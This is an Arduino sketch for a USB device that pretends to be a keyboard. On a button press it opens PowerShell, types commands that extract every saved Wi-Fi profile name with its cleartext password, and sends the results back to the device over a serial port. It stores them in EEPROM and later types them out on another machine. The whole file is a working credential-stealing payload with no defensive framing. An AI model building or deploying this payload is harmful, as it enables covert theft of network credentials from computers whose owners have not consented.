#include <Keyboard.h>
#include <EEPROM.h>
char stringArray[500] = {""};
int button = 10;
char executedPayload = 0x00;


void setup() {
    pinMode(10, INPUT_PULLUP);
    Serial.begin(9600);
    Keyboard.begin();
}

void loop() {
    if (executedPayload == 0x00) {
        if (digitalRead(button) == LOW) {
            extractData();
            executedPayload = 0x01;
        }
    } else {
        if (digitalRead(button) == LOW) {
            dispatchData();
        }
    }
}
    
void extractData() {    
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.print("Powershell");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(2000);
    digitalWrite(13, HIGH);
    delay(200);
    Keyboard.println("(netsh wlan show profiles) |");
    Keyboard.println("Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |");
    Keyboard.println("%{(netsh wlan show profile name=\"$name\" key=clear)} |");
    Keyboard.println("Select-String \"Key Content\\W+\\:(.+)$\" |");
    Keyboard.println("%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |");
    Keyboard.println("%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} |");
    Keyboard.println("Format-Table -AutoSize |");
    Keyboard.println("Out-String -OutVariable dataCaptured");
    delay(200);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    digitalWrite(13, LOW);
    Keyboard.println("$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\")");
    delay(200);
    Keyboard.println("$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\")");
    delay(200);
    Keyboard.print("$serialObject = new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print("$comPort");
    Keyboard.println(", 9600, None, 8, one");
    delay(200);
    Keyboard.println("$serialObject.Open()");
    delay(200);
    Keyboard.println("$serialObject.Write(\"$dataCaptured\")");
    delay(200);
    Keyboard.println("$serialObject.close()");
    delay(200);
    Keyboard.println("exit");
    delay(200);
    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();
    EEPROM.put(1, stringArray);
}

void dispatchData() {
    delay(500);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.println("text editor");
    delay(700);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(3000);
    Keyboard.print(EEPROM.get(1, stringArray));
}
